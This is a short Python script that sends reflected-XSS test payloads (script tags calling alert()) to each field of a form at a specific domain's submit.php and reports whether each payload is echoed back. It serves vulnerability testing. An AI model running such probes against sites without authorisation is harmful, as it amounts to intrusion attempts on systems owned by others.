import requests

url = 'https://61794237.myfancydomain.ch/submit.php'

payloads = {
    'first': '<script >alert("XSS first")</script >',
    'last': '<script >alert("XSS last")</script >',
    'email': '<script >alert("XSS email")</script >',
    'street': '<script >alert("XSS street")</script >',
    'street2': '<script >alert("XSS street2")</script >',
    'city': '<script >alert("XSS city")</script >',
    'postal': '<script >alert("XSS postal")</script >',
    'location': '<script >alert("XSS location")</script >',
    'complaints': '<script >alert("XSS complaints")</script >',
    'outcome': '<script >alert("XSS outcome")</script >',
    'signature': '<script >alert("XSS signature")</script >',
}

for field, payload in payloads.items():
    r = requests.post(url, data={field: payload})

    if payload in r.text:
        print(f'XSS Vulnerability detected in {field}')
    else:
        print(f'No XSS Vulnerability detected in {field}')